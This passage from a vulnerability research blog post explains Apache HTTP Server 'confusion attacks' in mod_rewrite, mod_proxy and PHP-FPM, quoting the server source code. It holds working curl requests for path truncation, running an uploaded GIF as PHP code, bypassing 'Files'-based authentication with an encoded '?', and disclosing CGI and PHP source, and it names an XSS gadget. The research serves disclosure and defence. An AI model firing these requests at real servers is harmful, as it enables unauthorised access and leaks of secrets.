    <span class="n">apr_array_header_t</span> <span class="o">*</span><span class="n">rewriteconds</span><span class="p">;</span>
    <span class="n">rewritecond_entry</span> <span class="o">*</span><span class="n">conds</span><span class="p">;</span>
    
    <span class="c1">// [...]</span>
    
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">rewriteconds</span><span class="o">-&gt;</span><span class="n">nelts</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">rewritecond_entry</span> <span class="o">*</span><span class="n">c</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">conds</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
        <span class="n">rc</span> <span class="o">=</span> <span class="n">apply_rewrite_cond</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">ctx</span><span class="p">);</span>
        
        <span class="c1">// [...] do the remaining stuff</span>
        
    <span class="p">}</span>
    
    <span class="cm">/* Now adjust API's knowledge about r-&gt;filename and r-&gt;args */</span>
    <span class="n">r</span><span class="o">-&gt;</span><span class="n">filename</span> <span class="o">=</span> <span class="n">newuri</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">ctx</span><span class="o">-&gt;</span><span class="n">perdir</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">RULEFLAG_DISCARDPATHINFO</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">r</span><span class="o">-&gt;</span><span class="n">path_info</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">splitout_queryargs</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">flags</span><span class="p">);</span>         <span class="c1">// &lt;------- [!!!] Truncate the `r-&gt;filename`</span>
    
    <span class="c1">// [...]</span>
<span class="p">}</span>
</code></pre></div></div>

<h5 id="️-1-1-1-path-truncation">✔️ 1-1-1. Path Truncation</h5>

<p>The first primitive leverages this truncation on the filesystem path. Imagine the following <code class="language-plaintext highlighter-rouge">RewriteRule</code>:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">RewriteEngine</span> <span class="ss">On</span>
<span class="nc">RewriteRule</span> "^/user/(.+)$" "/var/user/$1/profile.yml"
</code></pre></div></div>

<p>The server would open the corresponding profile based on the username followed by the path <code class="language-plaintext highlighter-rouge">/user/</code>, for example:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://server/user/orange
 <span class="c"># the output of file `/var/user/orange/profile.yml`</span>
</code></pre></div></div>

<p>Since <code class="language-plaintext highlighter-rouge">mod_rewrite</code> forcibly treats all rewritten result as a URL, even when the target is a filesystem path, it can be truncated at a question mark, cutting off the tailing <code class="language-plaintext highlighter-rouge">/profile.yml</code>, like:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://server/user/orange%2Fsecret.yml%3F
 <span class="c"># the output of file `/var/user/orange/secret.yml`</span>
</code></pre></div></div>

<p>This is our first primitive — Path Truncation. Let’s pause our exploration of this primitive here for a moment. Although it might seem like a minor flaw for now, remember it— it will reappear in later attacks, gradually tearing open this seemingly little breach! 😜</p>

<h5 id="️-1-1-2-mislead-rewriteflag-assignment">✔️ 1-1-2. Mislead RewriteFlag Assignment</h5>

<p>The second exploitation of the truncation primitive is to mislead the assignment of <code class="language-plaintext highlighter-rouge">RewriteFlags</code>. Imagine a sysadmin managing websites and their corresponding handlers through the following <code class="language-plaintext highlighter-rouge">RewriteRule</code>:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">RewriteEngine</span> <span class="ss">On</span>
<span class="nc">RewriteRule</span>  ^(.+\.php)$  $1  [H=application/x-httpd-php]
</code></pre></div></div>

<p>If a request ends with the <code class="language-plaintext highlighter-rouge">.php</code> extension, it adds the corresponding handler for the <code class="language-plaintext highlighter-rouge">mod_php</code> (this can also be an Environment Variable or Content-Type; you can refer to the official <a href="https://httpd.apache.org/docs/2.4/rewrite/flags.html">RewriteRule Flags</a> manual for details).</p>

<p>Since the truncation behavior of the <code class="language-plaintext highlighter-rouge">mod_rewrite</code> occurs after the regular expression match, an attacker can use the original rule to apply flags to requests they shouldn’t apply to by using a <code class="language-plaintext highlighter-rouge">?</code>. For example, an attacker could upload a GIF image embedded with malicious PHP code and execute it as a backdoor through the following crafted request:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://server/upload/1.gif
 <span class="c"># GIF89a &lt;?=`id`;&gt;</span>

<span class="nv">$ </span>curl http://server/upload/1.gif%3fooo.php
 <span class="c"># GIF89a uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
</code></pre></div></div>

<p><br /></p>

<h4 id="️-primitive-1-2-acl-bypass">⚔️ Primitive 1-2. ACL Bypass</h4>

<p>The second primitive of Filename Confusion occurs in the <code class="language-plaintext highlighter-rouge">mod_proxy</code>. Unlike the previous primitive which treats targets as a URL in all cases, this time <strong>the authentication and access control bypass is caused by the inconsistent semantic of <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> among the modules!</strong></p>

<p>It actually makes sense for the <code class="language-plaintext highlighter-rouge">mod_proxy</code> to treat <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> as a URL, given that the primary  purpose of a Proxy is to “redirect” requests to other URLs. However, security issues when different components interact — especially the case when most modules by default treat the <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> as a filesystem path, imagine you use a file-based access control, and now <code class="language-plaintext highlighter-rouge">mod_proxy</code> treats <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> as a URL; this inconsistency can lead to the access control or authentication bypass!</p>

<p>A classic example is when sysadmins use the <code class="language-plaintext highlighter-rouge">Files</code> directive to restrict a single file, like <code class="language-plaintext highlighter-rouge">admin.php</code>:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">Files</span><span class="sr"> "admin.php"</span><span class="p">&gt;
</span>    <span class="nc">AuthType</span> <span class="ss">Basic</span> 
    <span class="ss">AuthName</span> "Admin Panel"
    <span class="nc">AuthUserFile</span> "/etc/apache2/.htpasswd"
    <span class="nc">Require</span> valid-user
<span class="p">&lt;/</span><span class="nl">Files</span><span class="p">&gt;
</span></code></pre></div></div>

<p>This type of configuration can be bypassed directly under the default PHP-FPM installation! It’s also worth mentioning that this is one of the most common ways to configure authentication in Apache HTTP Server! Suppose you visit a URL like this:</p>

<blockquote>
  <p>http://server/admin.php%3Fooo.php</p>
</blockquote>

<p>First, in the HTTP lifecycle at this URL, the authentication module will compare the requested filename with the protected files. At this point, the <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> field is <code class="language-plaintext highlighter-rouge">admin.php?ooo.php</code>, which obviously does not match <code class="language-plaintext highlighter-rouge">admin.php</code>, so the module will assume that the current request does not require authentication. However, the PHP-FPM configuration is set to forward requests ending in <code class="language-plaintext highlighter-rouge">.php</code> to the <code class="language-plaintext highlighter-rouge">mod_proxy</code> using the <code class="language-plaintext highlighter-rouge">SetHandler</code> directive:</p>

<p><strong><em>Path: /etc/apache2/mods-enabled/php8.2-fpm.conf</em></strong></p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Using (?:pattern) instead of (pattern) is a small optimization that</span>
<span class="c"># avoid capturing the matching pattern (as $1) which isn't used here</span>
<span class="p">&lt;</span><span class="nl">FilesMatch</span><span class="sr"> ".+\.ph(?:ar|p|tml)$"</span><span class="p">&gt;
</span>    <span class="nc">SetHandler</span> "proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost"
<span class="p">&lt;/</span><span class="nl">FilesMatch</span><span class="p">&gt;
</span></code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">mod_proxy</code> will rewrite <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> to the following URL and call the sub-module <code class="language-plaintext highlighter-rouge">mod_proxy_fcgi</code> to handle the subsequent FastCGI protocol:</p>

<blockquote>
  <p>proxy:fcgi://127.0.0.1:9000/var/www/html/admin.php?ooo.php</p>
</blockquote>

<p>Since the backend receives the filename in a strange format, PHP-FPM has to handle this behavior specially. The logic of this handling is as follows:</p>

<p><strong><em>Path: <a href="https://github.com/php/php-src/blob/ce51bfac759dedac1537f4d5666dcd33fbc4a281/sapi/fpm/fpm/fpm_main.c#L1044">sapi/fpm/fpm/fpm_main.c#L1044</a></em></strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define APACHE_PROXY_FCGI_PREFIX "proxy:fcgi://"
#define APACHE_PROXY_BALANCER_PREFIX "proxy:balancer://"
</span>
<span class="k">if</span> <span class="p">(</span><span class="n">env_script_filename</span> <span class="o">&amp;&amp;</span>
    <span class="n">strncasecmp</span><span class="p">(</span><span class="n">env_script_filename</span><span class="p">,</span> <span class="n">APACHE_PROXY_FCGI_PREFIX</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">APACHE_PROXY_FCGI_PREFIX</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* advance to first character of hostname */</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">env_script_filename</span> <span class="o">+</span> <span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">APACHE_PROXY_FCGI_PREFIX</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
    <span class="k">while</span> <span class="p">(</span><span class="o">*</span><span class="n">p</span> <span class="o">!=</span> <span class="sc">'\0'</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">p</span> <span class="o">!=</span> <span class="sc">'/'</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">p</span><span class="o">++</span><span class="p">;</span>    <span class="cm">/* move past hostname and port */</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">p</span> <span class="o">!=</span> <span class="sc">'\0'</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* Copy path portion in place to avoid memory leak.  Note
         * that this also affects what script_path_translated points
         * to. */</span>
        <span class="n">memmove</span><span class="p">(</span><span class="n">env_script_filename</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
        <span class="n">apache_was_here</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="cm">/* ignore query string if sent by Apache (RewriteRule) */</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">env_script_filename</span><span class="p">,</span> <span class="sc">'?'</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
        <span class="o">*</span><span class="n">p</span> <span class="o">=</span><span class="mi">0</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>As you can see, PHP-FPM first normalizes the filename and splits it at the question mark <code class="language-plaintext highlighter-rouge">?</code> to extract the actual file path for execution (which is <code class="language-plaintext highlighter-rouge">/var/www/html/admin.php</code>). This leads to the bypass, and basically, <strong>all authentications or access controls based on the <code class="language-plaintext highlighter-rouge">Files</code> directive for a single PHP file are at risk when running together with PHP-FPM!</strong> 😮</p>

<p>Many potentially risky configurations can be found on GitHub, such as <code class="language-plaintext highlighter-rouge">phpinfo()</code> restricted to internal network access only:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># protect phpinfo, only allow localhost and local network access</span>
<span class="p">&lt;</span><span class="nl">Files</span><span class="sr"> php-info.php</span><span class="p">&gt;
</span>    <span class="c"># LOCAL ACCESS ONLY</span>
    <span class="c"># Require local </span>

    <span class="c"># LOCAL AND LAN ACCESS</span>
    <span class="nc">Require</span> ip 10 172 192.168
<span class="p">&lt;/</span><span class="nl">Files</span><span class="p">&gt;
</span></code></pre></div></div>

<p>Adminer blocked by <code class="language-plaintext highlighter-rouge">.htaccess</code>:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">Files</span><span class="sr"> adminer.php</span><span class="p">&gt;
</span>    <span class="nc">Order</span> Allow,Deny
    <span class="nc">Deny</span> <span class="ss">from</span> <span class="ss">all</span>
<span class="p">&lt;/</span><span class="nl">Files</span><span class="p">&gt;
</span></code></pre></div></div>

<p>Protected <code class="language-plaintext highlighter-rouge">xmlrpc.php</code>:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">Files</span><span class="sr"> xmlrpc.php</span><span class="p">&gt;
</span>    <span class="nc">Order</span> Allow,Deny
    <span class="nc">Deny</span> <span class="ss">from</span> <span class="ss">all</span>
<span class="p">&lt;/</span><span class="nl">Files</span><span class="p">&gt;
</span></code></pre></div></div>

<p>CLI tools prevented from direct access:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">Files</span><span class="sr"> "cron.php"</span><span class="p">&gt;
</span>    <span class="nc">Deny</span> <span class="ss">from</span> <span class="ss">all</span>
<span class="p">&lt;/</span><span class="nl">Files</span><span class="p">&gt;
</span></code></pre></div></div>

<p>Through an inconsistency in how the authentication module and <code class="language-plaintext highlighter-rouge">mod_proxy</code> interpret the <code class="language-plaintext highlighter-rouge">r-&gt;filename</code> field, all the above examples can be successfully bypassed with just a <code class="language-plaintext highlighter-rouge">?</code>.</p>

<p><br /></p>

<h3 id="-2-documentroot-confusion">🔥 2. DocumentRoot Confusion</h3>

<p>The next attack we’re diving into is the confusion based on DocumentRoot! Let’s consider this Httpd configuration for a moment:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">DocumentRoot</span> /var/www/html
<span class="nc">RewriteRule</span>  ^/html/(.*)$   /$1.html
</code></pre></div></div>

<p>When you visit the URL <code class="language-plaintext highlighter-rouge">http://server/html/about</code>, which file do you think Httpd actually opens? Is it the one under the root directory, <code class="language-plaintext highlighter-rouge">/about.html</code>, or is it from the DocumentRoot at <code class="language-plaintext highlighter-rouge">/var/www/html/about.html</code>?</p>

<p><img src="/assets/img/blog/20240809/2.png" alt="" /></p>

<p>The answer is — <strong>it accesses both paths</strong>. Yep, that’s our second Confusion Attack. <strong>For any<sup>[1]</sup> <code class="language-plaintext highlighter-rouge">RewriteRule</code>, Apache HTTP Server always tries to open both the path with DocumentRoot and without it!</strong> Amazing, right? 😉</p>

<p><em>[1] Located within <code class="language-plaintext highlighter-rouge">Server Config</code> or <code class="language-plaintext highlighter-rouge">VirtualHost Block</code></em></p>

<p><strong><em>Path: <a href="https://github.com/apache/httpd/blob/c3ad18b7ee32da93eabaae7b94541d3c32264340/modules/mappers/mod_rewrite.c#L4939">modules/mappers/mod_rewrite.c#L4939</a></em></strong></p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">conf</span><span class="o">-&gt;</span><span class="n">options</span> <span class="o">&amp;</span> <span class="n">OPTION_LEGACY_PREFIX_DOCROOT</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">uri_reduced</span> <span class="o">=</span> <span class="n">apr_table_get</span><span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">notes</span><span class="p">,</span> <span class="s">"mod_rewrite_uri_reduced"</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">prefix_stat</span><span class="p">(</span><span class="n">r</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">,</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">pool</span><span class="p">)</span> <span class="o">||</span> <span class="n">uri_reduced</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>     <span class="c1">// &lt;------ [1] access without root</span>
        <span class="kt">int</span> <span class="n">res</span><span class="p">;</span>
        <span class="kt">char</span> <span class="o">*</span><span class="n">tmp</span> <span class="o">=</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">uri</span><span class="p">;</span>

        <span class="n">r</span><span class="o">-&gt;</span><span class="n">uri</span> <span class="o">=</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">;</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">ap_core_translate</span><span class="p">(</span><span class="n">r</span><span class="p">);</span>             <span class="c1">// &lt;------ [2] access with root</span>
        <span class="n">r</span><span class="o">-&gt;</span><span class="n">uri</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">res</span> <span class="o">!=</span> <span class="n">OK</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">rewritelog</span><span class="p">((</span><span class="n">r</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="s">"prefixing with document_root of %s"</span>
                        <span class="s">" FAILED"</span><span class="p">,</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">));</span>

            <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="n">rewritelog</span><span class="p">((</span><span class="n">r</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="s">"prefixed with document_root to %s"</span><span class="p">,</span>
                    <span class="n">r</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="n">rewritelog</span><span class="p">((</span><span class="n">r</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="s">"go-ahead with %s [OK]"</span><span class="p">,</span> <span class="n">r</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">));</span>
    <span class="k">return</span> <span class="n">OK</span><span class="p">;</span>
<span class="err">}</span>
</code></pre></div></div>

<p>Most of the time, the version without DocumentRoot doesn’t exist, so Apache HTTP Server goes for the version with the DocumentRoot. But this behavior already lets us “intentionally” access paths outside the Web Root. <strong>If today we can control the prefix of the <code class="language-plaintext highlighter-rouge">RewriteRule</code>, couldn’t we access any file on the system?</strong> That’s the spirit of our second Confusion Attack! You can find numerous problematic configurations on GitHub, and even <a href="https://httpd.apache.org/docs/current/rewrite/remapping.html#rewrite-query">the examples from official Apache HTTP Server documentations</a> are vulnerable to attacks:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Remove mykey=???</span>
<span class="nc">RewriteCond</span> "%{QUERY_STRING}" "(.*(?:^|&amp;))mykey=([^&amp;]*)&amp;?(.*)&amp;?$"
<span class="nc">RewriteRule</span> "(.*)" "$1?%1%3"
</code></pre></div></div>

<p>There are other <code class="language-plaintext highlighter-rouge">RewriteRule</code> that are also affected, such as rules based on caching needs or hiding file extensions:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">RewriteRule</span>  "^/html/(.*)$"  "/$1.html"
</code></pre></div></div>

<p>The Rule trying to save bandwidth by opting for compressed versions of static files:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">RewriteRule</span>  "^(.*)\.(css|js|ico|svg)" "$1\.$2.gz"
</code></pre></div></div>

<p>The rule redirecting old URLs to the main site:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">RewriteRule</span>  "^/oldwebsite/(.*)$"  "/$1"
</code></pre></div></div>

<p>The rule returning a 200 OK for all CORS preflight requests:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">RewriteCond</span> %{REQUEST_METHOD} <span class="ss">OPTIONS</span>
<span class="nc">RewriteRule</span> ^(.*)$ $1 [R=200,L]
</code></pre></div></div>

<p>Theoretically, as long as the target prefix of a <code class="language-plaintext highlighter-rouge">RewriteRule</code> is controllable, we can access nearly the entire filesystem. But from the real-world cases  above, extensions like <code class="language-plaintext highlighter-rouge">.html</code> and <code class="language-plaintext highlighter-rouge">.gz</code> are the restrictions that keep us from being truly free. So, can we access files outside <code class="language-plaintext highlighter-rouge">.html</code>? I am not sure if you remember the primitive of Path Truncation from the Filename Confusion earlier? By combining these two primitives, we can freely access arbitrary files on the filesystem!</p>

<p>The following demonstrations are all based on this unsafe <code class="language-plaintext highlighter-rouge">RewriteRule</code>:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">RewriteEngine</span> <span class="ss">On</span>
<span class="nc">RewriteRule</span>  "^/html/(.*)$"  "/$1.html"
</code></pre></div></div>

<p><br /></p>

<h4 id="️-primitive-2-1-server-side-source-code-disclosure">⚔️ Primitive 2-1. Server-Side Source Code Disclosure</h4>

<p>Let’s introduce the first primitive of DocumentRoot Confusion — <strong>Arbitrary Server-Side Source Code Disclosure</strong>!</p>

<p>Since Apache HTTP Server decides whether to consider a file as a Server-Side Script based on the current directory or virtual host configuration, accessing target via an absolute path can confuse Httpd’s logic, causing it to leak contents that should have been executed as code.</p>

<h5 id="️-2-1-1-disclose-cgi-source-code">✔️ 2-1-1. Disclose CGI Source Code</h5>

<p>Starting with the disclosure of server-side CGI source code, since <code class="language-plaintext highlighter-rouge">mod_cgi</code> binds the CGI folder to a specified URL prefix via <code class="language-plaintext highlighter-rouge">ScriptAlias</code>, directly accessing a CGI file using its absolute path can leak its source code due to the change of URL prefix.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://server/cgi-bin/download.cgi
 <span class="c"># the processed result from download.cgi</span>
<span class="nv">$ </span>curl http://server/html/usr/lib/cgi-bin/download.cgi%3F
 <span class="c"># #!/usr/bin/perl</span>
 <span class="c"># use CGI;</span>
 <span class="c"># ...</span>
 <span class="c"># # the source code of download.cgi</span>
</code></pre></div></div>

<h5 id="️-2-1-2-disclose-php-source-code">✔️ 2-1-2. Disclose PHP Source Code</h5>

<p>Next is the disclosure of server-side PHP source code. Given that PHP has numerous use cases, if PHP environments are applied only to specific directories or virtual hosts (which is common in web hosting), accessing PHP files from a virtual host which didn’t support PHP can disclose the source code!</p>

<p>For example, <code class="language-plaintext highlighter-rouge">www.local</code> and <code class="language-plaintext highlighter-rouge">static.local</code> are two websites hosted on the same server; <code class="language-plaintext highlighter-rouge">www.local</code> allows PHP execution while <code class="language-plaintext highlighter-rouge">static.local</code> only serves static files. Hence, you can disclose sensitive info from <code class="language-plaintext highlighter-rouge">config.php</code> like this:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl http://www.local/config.php
 <span class="c"># the processed result (empty) from config.php</span>
<span class="nv">$ </span>curl http://www.local/var/www.local/config.php%3F <span class="nt">-H</span> <span class="s2">"Host: static.local"</span>
 <span class="c"># the source code of config.php</span>
</code></pre></div></div>

<p><br /></p>

<h4 id="️-primitive-2-2-local-gadgets-manipulation">⚔️ Primitive 2-2. Local Gadgets Manipulation!</h4>

<p>Next up is our second primitive — <strong>Local Gadgets Manipulation</strong>.</p>

<p>First, when we talked about “accessing any file on the filesystem,” did you wonder: “Hey, could an unsafe <code class="language-plaintext highlighter-rouge">RewriteRule</code> access <code class="language-plaintext highlighter-rouge">/etc/passwd</code>?” The answer is Yes, and also no. What?</p>

<p>Technically, the server does check if <code class="language-plaintext highlighter-rouge">/etc/passwd</code> exists, but Apache HTTP Server’s built-in access control blocks our access. Here’s a snippet from Apache HTTP Server’s <a href="https://github.com/apache/httpd/blob/trunk/docs/conf/httpd.conf.in#L115">configuration template</a>:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">Directory</span><span class="sr"> /</span><span class="p">&gt;
</span>    <span class="nc">AllowOverride</span> <span class="ss">None</span>
    <span class="nc">Require</span> <span class="ss">all</span> denied
<span class="p">&lt;/</span><span class="nl">Directory</span><span class="p">&gt;
</span></code></pre></div></div>

<p>You’ll notice it defaults to blocking access to the root directory <code class="language-plaintext highlighter-rouge">/</code> (<code class="language-plaintext highlighter-rouge">Require all denied</code>). So our “arbitrary file access” ability seems a bit less “any.” Does that mean the show’s over? Not really! We have already broken the trust of only-allowed-access to the DocumentRoot, it’s a significant step forward!</p>

<p>A closer inspection of different Httpd distributions reveals that <a href="https://sources.debian.org/src/apache2/2.4.62-1/debian/config-dir/apache2.conf.in/#L165">Debian/Ubuntu</a> operating systems by default allow <code class="language-plaintext highlighter-rouge">/usr/share</code>:</p>

<div class="language-apache highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">&lt;</span><span class="nl">Directory</span><span class="sr"> /usr/share</span><span class="p">&gt;
</span>    <span class="nc">AllowOverride</span> <span class="ss">None</span>
    <span class="nc">Require</span> <span class="ss">all</span> granted
<span class="p">&lt;/</span><span class="nl">Directory</span><span class="p">&gt;
</span></code></pre></div></div>

<p>So, the next step is to “squeeze” all possibilities within this directory. All available resources, such as existing tutorials, documentation, unit test files, and even programming languages like PHP, Python, and even PHP modules could become targets for our abuse!</p>

<p><em>P.S. Of course, the exploitation here is based on the Httpd distributed by Ubuntu/Debian operating systems. However, in practice, we have also found that some applications remove the <code class="language-plaintext highlighter-rouge">Require all denied</code> line from the root directory, allowing direct access to <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</em></p>

<p><img src="/assets/img/blog/20240809/3.png" alt="" /></p>

<h5 id="️-2-2-1-local-gadget-to-information-disclosure">✔️ 2-2-1. Local Gadget to Information Disclosure</h5>

<p>Let’s hunt for potentially exploitable files in this directory. First off, if the target Apache HTTP Server has the <code class="language-plaintext highlighter-rouge">websocketd</code> service installed, the default package includes an example PHP script <code class="language-plaintext highlighter-rouge">dump-env.php</code> under <code class="language-plaintext highlighter-rouge">/usr/share/doc/websocketd/examples/php/</code>. If there’s a PHP environment on the target server, this script can be accessed directly to leak sensitive environment variables.</p>

<p>Additionally, if the target has services like Nginx or Jetty installed, though <code class="language-plaintext highlighter-rouge">/usr/share</code> is theoretically a read-only copy for package installation, these services still place their default Web Roots under <code class="language-plaintext highlighter-rouge">/usr/share</code>, making it possible to leak sensitive web application information, such as the <code class="language-plaintext highlighter-rouge">web.xml</code> in Jetty.</p>

<ul>
  <li>/usr/share/nginx/html/</li>
  <li>/usr/share/jetty9/etc/</li>
  <li>/usr/share/jetty9/webapps/</li>
</ul>

<p>Here’s a simple demonstration using <code class="language-plaintext highlighter-rouge">setup.php</code> from the <code class="language-plaintext highlighter-rouge">Davical</code> package, which exists as a read-only copy, to leak contents of <code class="language-plaintext highlighter-rouge">phpinfo()</code>.</p>

<p><img src="/assets/img/blog/20240809/4.png" alt="" /></p>

<h5 id="️-2-2-2-local-gadget-to-xss">✔️ 2-2-2. Local Gadget to XSS</h5>

<p>Next, how to turn this primitive into XSS? On the Ubuntu Desktop environment, LibreOffice, an open-source office suite, is installed by default. We can leverage the language switch feature in the help files to achieve XSS.</p>

<p><strong><em>Path: /usr/share/libreoffice/help/help.html</em></strong></p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">n</span> <span class="o">=</span> <span class="nx">url</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="dl">'</span><span class="s1">?</span><span class="dl">'</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">n</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// the URL came from LibreOffice help (F1)</span>
        <span class="kd">var</span> <span class="nx">version</span> <span class="o">=</span> <span class="nx">getParameterByName</span><span class="p">(</span><span class="dl">"</span><span class="s2">Version</span><span class="dl">"</span><span class="p">,</span> <span class="nx">url</span><span class="p">);</span>
        <span class="kd">var</span> <span class="nx">query</span> <span class="o">=</span> <span class="nx">url</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">n</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">url</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
        <span class="kd">var</span> <span class="nx">newURL</span> <span class="o">=</span> <span class="nx">version</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">/index.html?</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">query</span><span class="p">;</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nx">newURL</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="dl">'</span><span class="s1">latest/index.html</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">}</span>
</code></pre></div></div>

